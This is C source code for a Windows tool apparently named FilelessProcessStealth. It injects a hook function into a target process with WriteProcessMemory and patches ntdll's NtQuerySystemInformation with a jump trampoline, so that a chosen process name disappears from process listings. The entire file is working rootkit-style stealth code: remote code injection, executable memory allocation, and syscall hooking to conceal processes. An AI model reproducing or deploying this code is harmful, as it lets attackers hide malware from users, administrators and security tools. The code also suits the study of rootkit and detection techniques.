#include "ProcessStealth.h"

void usage() {
	puts("[Usage] FilelessProcessStealth.exe [target process name] [hide process name]");
}

void elog(const char* log) {
	printf("[!] %s failed..\n", log);
}

void slog(const char* name, const DWORD data) {
	printf("[*] %s : 0x%x\n", name, data);
}

void memFree(PVOID mem, SIZE_T size) {
	VirtualFree(mem, size, MEM_DECOMMIT);
	VirtualFree(mem, 0, MEM_RELEASE);
}

DWORD getPID(wchar_t* procName) {
	DWORD pid = 0xffffffffffffffff;

	PSYSTEM_PROCESS_INFORMATION si = NULL;
	ULONG returnLength;

	while (1) {
		Sleep(500);

		if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &returnLength) != STATUS_INFO_LENGTH_MISMATCH) {
			continue;
		}

		if ((si = VirtualAlloc(NULL, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
			continue;
		}

		if (NT_SUCCESS(NtQuerySystemInformation(SystemProcessInformation, si, returnLength, &returnLength))) {
			break;
		}

		VirtualFree(si, returnLength, MEM_DECOMMIT);
		VirtualFree(si, 0, MEM_RELEASE);
	}

	PSYSTEM_PROCESS_INFORMATION pFree = si;
	si = (ULONGLONG)si + si->NextEntryOffset;

	while (1) {
		if (!wcsicmp(si->ImageName.Buffer, procName)) {
			pid = si->UniqueProcessId;
		}
		
		if (si->NextEntryOffset == 0) {
			break;
		}

		si = (ULONGLONG)si + si->NextEntryOffset;
	}

	VirtualFree(pFree, returnLength, MEM_DECOMMIT);
	VirtualFree(pFree, 0, MEM_RELEASE);

	return pid;
}

DWORD findOverwritePoint(PVOID address){
	ULONGLONG overwritePoint = 0xCCCCCCCCCCCCCCCC;
	/*
		int3
		int3
		int3
		int3
		int3
		int3
		int3
		int3
	*/

	for(int i = 0; ; i++){
		if (memcmp((ULONGLONG)address + i, &overwritePoint, 8) == 0){
			return i;
		}
	}
}

NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength){
	/*
		NewNtQuerySystemInformation(){
			cloneNtQuerySystemInformation = 0xcccccccccccccccc -> overwritten with cloneSyscall
			hideProcName = cloneNtQuerySystemInformation + 16 -> hideProcName
		}
		cloneSyscall -> cloneNtQuerySystemInformation
		hideProcName -> cloneNtQuerySystemInformation + 16
	*/

	volatile NTSTATUS* cloneNtQuerySystemInformation = 0xCCCCCCCCCCCCCCCC;
	wchar_t* hideProcName = (ULONGLONG)cloneNtQuerySystemInformation + 16;

	NTSTATUS ntstatus = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength))cloneNtQuerySystemInformation)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (ntstatus != STATUS_SUCCESS) {
		return ntstatus;
	}

	//in case SystemProcessInformation
	if (SystemInformationClass == 5) {
		PSYSTEM_PROCESS_INFORMATION pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		PSYSTEM_PROCESS_INFORMATION pPrev = pCur;
		pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;

		while (TRUE) {
			//wcsicmp
			wchar_t c, c1;
			BOOL res = TRUE;

			for (int i = 0; (*(hideProcName + i) != NULL) && (*(pCur->ImageName.Buffer + i) != NULL); i++) {
				c = lowerCase(*(hideProcName + i));
				c1 = lowerCase(*(pCur->ImageName.Buffer + i));

				res = (c == c1) ? TRUE : FALSE;
				if (res == FALSE) {
					break;
				}
			}

			//manipulation
			if (res) {
				if (pCur->NextEntryOffset == 0) {
					pPrev->NextEntryOffset = 0;
				}
				else {
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
			}
			else {
				pPrev = pCur;
			}

			if (pCur->NextEntryOffset == 0) {
				break;
			}

			pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
		}
	}
	return ntstatus;
}

void AtherFunc() {}

int wmain(int argc, wchar_t* argv[]){
	BYTE syscallCode[16] = { 0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3 };
	/*
		mov r10, rcx
		mov eax, 0x00000000
		syscall
		ret
	*/

	BYTE trampolineCode[12] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
	/*
		mov rax, 0x0000000000000000
		jmp rax
	*/

	if (argc > 3 || argc < 3) {
		usage();
		return -1;
	}

	if ((wcslen(argv[1]) > 0xff) || (wcslen(argv[2]) > 0xff)) {
		elog("invalid process name length");
		return -1;
	}

	wchar_t procName[0x100];
	wcscpy(procName, argv[2]);

	DWORD pid = 0x00;
	if ((pid = getPID(argv[1])) == 0xffffffffffffffff) {
		elog("getting target process pid");
		return -1;
	}
	slog("target process pid", pid);

	PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		elog("getting NtQuerySystemInformation address");
		return -1;
	}
	slog("NtQuerySystemInformation", NtQuerySystemInformation);

	HANDLE hProc;
	if ((hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL) {
		elog("opening target process");
		return -1;
	}
	slog("hProc", hProc);

	PVOID hookFunc;
	if ((hookFunc = VirtualAllocEx(hProc, NULL, NewNtQuerySystemInformation_Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		elog("allocating hook function");
		return -1;
	}
	slog("hookFunc", hookFunc);

	memcpy(trampolineCode + 2, &hookFunc, 8);

	SIZE_T numberOfBytesWritten;
	if (!WriteProcessMemory(hProc, hookFunc, NewNtQuerySystemInformation, NewNtQuerySystemInformation_Size, &numberOfBytesWritten)) {
		elog("writting hook function");
		
		memFree(hookFunc, NewNtQuerySystemInformation_Size);
		return -1;
	}
	puts("[+] wrote hook function");
	slog("written bytes", numberOfBytesWritten);

	DWORD syscallNumber = *(DWORD*)((ULONGLONG)NtQuerySystemInformation + 4);
	if (syscallNumber == 0x00) {
		elog("invalid syscallNumber");
		return -1;
	}
	slog("syscallNumber", syscallNumber);

	memcpy(syscallCode + 4, &syscallNumber, 4);
	
	PVOID cloneSyscall = (ULONGLONG)hookFunc + NewNtQuerySystemInformation_Size;
	if (!WriteProcessMemory(hProc, cloneSyscall, syscallCode, 16, &numberOfBytesWritten)) {
		elog("cloning NtQuerySystemInformation");

		memFree(hookFunc, NewNtQuerySystemInformation_Size);
		return -1;
	}
	puts("[+] cloned NtQuerySystemInformation");

	PVOID hideProcName = (ULONGLONG)cloneSyscall + 16;
	if (!WriteProcessMemory(hProc, hideProcName, procName, wcslen(procName) * 2, &numberOfBytesWritten)) {
		elog("writing hide process name");

		memFree(hookFunc, NewNtQuerySystemInformation_Size);
		return -1;
	}
	puts("[+] wrote hide process name");
	slog("written bytes", numberOfBytesWritten);

	if (!WriteProcessMemory(hProc, (ULONGLONG)hookFunc + findOverwritePoint(NewNtQuerySystemInformation), &cloneSyscall, 8, &numberOfBytesWritten)) {
		elog("setting cloned NtQuerySystemInformation and hide process name");
		
		memFree(hookFunc, NewNtQuerySystemInformation_Size);
		return -1;
	}
	puts("[+] set cloned NtQuerySystemInformation and hide process name\n");

	DWORD oldProtect;
	if (!VirtualProtectEx(hProc, NtQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		elog("releasing protect NtQuerySystemInformation");

		memFree(hookFunc, NewNtQuerySystemInformation_Size);
		return -1;
	}

	puts("[+] release protect NtQuerySystemInformation");

	if (!WriteProcessMemory(hProc, NtQuerySystemInformation, trampolineCode, 12, &numberOfBytesWritten)) {
		elog("writing trampoline code");

		memFree(hookFunc, NewNtQuerySystemInformation_Size);
		return -1;
	}
	puts("[+] hiding success!");

	return 0;
}